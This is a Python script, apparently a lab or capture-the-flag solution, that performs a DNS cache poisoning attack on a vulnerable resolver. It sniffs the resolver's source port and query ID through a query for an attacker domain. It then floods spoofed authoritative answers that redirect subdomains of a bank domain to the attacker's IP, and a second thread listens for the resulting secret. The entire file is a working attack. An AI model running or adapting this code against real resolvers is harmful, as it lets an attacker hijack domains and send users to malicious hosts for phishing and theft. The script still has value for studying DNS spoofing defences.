'''this project is for academic purposes only
	brought to you by Luca and Luigi
'''
from random import randint
from dnslib import *
from threading import *

#Global variables
ATTACKER_IP = "192.168.56.1"
VULNDNS_IP = "192.168.56.101"
BoA_DNS_IP = "10.0.0.1"
FAKE_IP = "192.168.56.103"

VULNDNS_PORT = 53
BADGUY_DNS_PORT = 55553

BoA_DOMAIN = "bankofallan.co.uk"
BADGUY_DOMAIN = "badguy.ru"

stop = False


def main():
    #Thread used to listen the secret
    secret_listener = Thread(target = listen_routine)
    #Thread used to perform the attack routine
    poison = Thread(target = attack_routine)

    #Start the threads
    secret_listener.start()
    poison.start()

    #Threads should join
    secret_listener.join()
    poison.join()


#Simple routine used to receive the flag on port 1337 once we successfully poison the VulnDNS cache
def listen_routine():
    #Socket on which we will wait and listen for the secret
    sniff_secret_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sniff_secret_sock.bind((ATTACKER_IP, 1337))

    #Listen for the secret
    secret, addr = sniff_secret_sock.recvfrom(1024)
    print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
    print "The secret is: " + secret

    #Notify the attack_routine to stop
    global stop
    stop = True


#Routine of the actual attack
def attack_routine():
    #Socket used to make fake requests to VulnDNS
    fake_request_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    fake_request_sock.bind((FAKE_IP, 53535))

    #Socket used to listen requests sent to the badguy dns server from VulnDNS
    badguy_dns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    badguy_dns_sock.bind((ATTACKER_IP, BADGUY_DNS_PORT))

    #Socket used to send the forged answers to VulnDNS
    forged_response_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    forged_response_sock.bind((BoA_DNS_IP, 53))

    #Don't stop until the secret is received
    while not stop:
        print "New Attempt"
        #First make query for a random address in the badguy.ru domain
        badguy_query_addr = "gg" + str(randint(0,400)) + "." + BADGUY_DOMAIN
        badguy_request = DNSRecord.question(badguy_query_addr)
        badguy_request_data = badguy_request.pack()
        fake_request_sock.sendto(bytes(badguy_request_data), (VULNDNS_IP, VULNDNS_PORT))

        #Get the request from the VulnDNS to badguy dns and discover qid and src port
        pkt_data, addr = badguy_dns_sock.recvfrom(1024)
        vulndns_src_port = addr[1]
        sniffed_qid = DNSRecord.parse(pkt_data).header.id
        print "-- Source port: " + str(vulndns_src_port) + " --- Sniffed QID: " + str(sniffed_qid)

        #Then make query for a random address in the bankofallan.co.uk domain
        boa_query_addr = "gg" + str(randint(0,400)) + "." + BoA_DOMAIN
        boa_request = DNSRecord.question(boa_query_addr)
        boa_request_data = boa_request.pack()
        fake_request_sock.sendto(bytes(boa_request_data), (VULNDNS_IP, VULNDNS_PORT))

        #Forge an answer for the same query we made, making it seems to come from the bankofallan dns and try to match the qid
        forged_answers = DNSRecord(DNSHeader(qr=1,aa=1,ra=1), q=DNSQuestion(boa_query_addr), a=RR(boa_query_addr,rdata=A(ATTACKER_IP)))
        for i in range(0,100):
            forged_answers.header.id = sniffed_qid + randint(0,150)
            forged_answers_data = forged_answers.pack()
            forged_response_sock.sendto(bytes(forged_answers_data), (VULNDNS_IP, vulndns_src_port))
        #If the attempt is not successuful, retry
        time.sleep(1)


if __name__ == '__main__':
    main()
